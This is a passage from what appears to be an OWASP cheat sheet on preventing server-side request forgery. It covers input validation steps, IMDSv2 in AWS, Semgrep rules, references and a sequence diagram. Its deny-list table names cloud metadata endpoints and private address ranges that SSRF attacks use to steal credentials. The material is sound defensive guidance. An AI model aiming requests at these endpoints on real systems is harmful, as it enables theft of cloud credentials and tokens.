Like for the case [n°1](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#case-1-application-can-send-request-only-to-identified-and-trusted-applications), it is assumed that the `IP Address` or `domain name` is required to create the request that will be sent to the *TargetApplication*.

The first validation on the input data presented in the case [n°1](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#application-layer) on the 3 types of data will be the same for this case **BUT the second validation will differ**. Indeed, here we must use the block-list approach.

> **Regarding the proof of legitimacy of the request**: The *TargetedApplication* that will receive the request must generate a random token (ex: alphanumeric of 20 characters) that is expected to be passed by the caller (in body via a parameter for which the name is also defined by the application itself and only allow characters set `[a-z]{1,10}`) to perform a valid request. The receiving endpoint must only accept HTTP POST requests.

**Validation flow (if one the validation steps fail then the request is rejected):**

1. The application will receive the IP address or domain name of the *TargetedApplication* and it will apply the first validation on the input data using the libraries/regex mentioned in this [section](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#application-layer).
2. The second validation will be applied against the IP address or domain name of the *TargetedApplication* using the following block-list approach:
   - For IP address:
     - The application will verify that it is a public one (see the hint provided in the next paragraph with the python code sample).
   - For domain name:
        1. The application will verify that it is a public one by trying to resolve the domain name against the DNS resolver that will only resolve internal domain name. Here, it must return a response indicating that it do not know the provided domain because the expected value received must be a public domain.
        2. To prevent the `DNS pinning` attack described in this [document](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf), the application will retrieve all the IP addresses behind the domain name provided (taking records *A* + *AAAA* for IPv4 + IPv6) and it will apply the same verification described in the previous point about IP addresses.
3. The application will receive the protocol to use for the request via a dedicated input parameter for which it will verify the value against an allowed list of protocols (`HTTP` or `HTTPS`).
4. The application will receive the parameter name for the token to pass to the *TargetedApplication* via a dedicated input parameter for which it will only allow the characters set `[a-z]{1,10}`.
5. The application will receive the token itself via a dedicated input parameter for which it will only allow the characters set `[a-zA-Z0-9]{20}`.
6. The application will receive and validate (from a security point of view) any business data needed to perform a valid call.
7. The application will build the HTTP POST request **using only validated information** and will send it (*don't forget to disable the support for [redirection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections) in the web client used*).

##### Network layer

Similar to the following [section](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#network-layer).

## IMDSv2 in AWS

In cloud environments SSRF is often used to access and steal credentials and access tokens from metadata services (e.g. AWS Instance Metadata Service, Azure Instance Metadata Service, GCP metadata server).

[IMDSv2](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/) is an additional defence-in-depth mechanism for AWS that mitigates some of the instances of SSRF.

To leverage this protection migrate to IMDSv2 and disable old IMDSv1. Check out [AWS documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) for more details.

## Deny-list (Last Resort)

**Deny-lists are bypass-prone. Prefer allow-lists.**

**When unavoidable, block these minimum ranges:**

| Service | Block IPs/Domains |
|---------|-------------------|
| **AWS IMDS** | `169.254.169.254`, `metadata.amazonaws.com` |
| **GCP Metadata** | `metadata.google.internal`, `169.254.169.254` |
| **Azure IMDS** | `169.254.169.254` |
| **Localhost** | `127.0.0.0/8`, `0.0.0.0/8`, `::1/128` |
| **RFC1918 Private** | `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` |
| **Multicast** | `224.0.0.0/4`, `ff00::/8` |

**Full production example:** [ComputerCraft SSRF deny-list](https://github.com/cc-tweaked/CC-Tweaked/blob/b9ed66983d714bcb5c6bf15b428e01a035106dbf/projects/core/src/main/java/dan200/computercraft/core/apis/http/options/AddressPredicate.java#L112-L157)

**Sources:**

- [IANA IPv4 Special Registry](https://www.iana.org/assignments/iana-ipv4-special-registry/iana-ipv4-special-registry.xhtml)
- [IANA IPv6 Special Registry](https://www.iana.org/assignments/iana-ipv6-special-registry/iana-ipv6-special-registry.xhtml)

## Semgrep Rules

[Semgrep](https://semgrep.dev/) is a command-line tool for offline static analysis. Use pre-built or custom rules to enforce code and security standards in your codebase.
Explore the [Semgrep rules](https://semgrep.dev/r?q=ssrf) for SSRF to effectively identify and investigate potential SSRF vulnerabilities.

## References

Online version of the [SSRF bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM) (PDF version is used in this cheat sheet).

Article about [Bypassing SSRF Protection](https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b).

Articles about SSRF attacks: [Part 1](https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a), [part 2](https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-2-fun-with-ipv4-addresses-eb51971e476d) and  [part 3](https://medium.com/poka-techblog/server-side-request-forgery-ssrf-part-3-other-advanced-techniques-3f48cbcad27e).

Article about [IMDSv2](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)

## Tools and code used for schemas

- [Mermaid Online Editor](https://mermaidjs.github.io/mermaid-live-editor) and [Mermaid documentation](https://mermaidjs.github.io/).
- [Draw.io Online Editor](https://www.draw.io/).

Mermaid code for SSRF common flow (printscreen are used to capture PNG image inserted into this cheat sheet):

```text
sequenceDiagram
    participant Attacker
    participant VulnerableApplication
    participant TargetedApplication
    Attacker->>VulnerableApplication: Crafted HTTP request
    VulnerableApplication->>TargetedApplication: Request (HTTP, FTP...)
    Note left of TargetedApplication: Use payload included<br>into the request to<br>VulnerableApplication
    TargetedApplication->>VulnerableApplication: Response
    VulnerableApplication->>Attacker: Response
    Note left of VulnerableApplication: Include response<br>from the<br>TargetedApplication
```

Draw.io schema XML code for the "[case 1 for network layer protection about flows that we want to prevent](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Case1_NetworkLayer_PreventFlow.xml)" schema (printscreen are used to capture PNG image inserted into this cheat sheet).
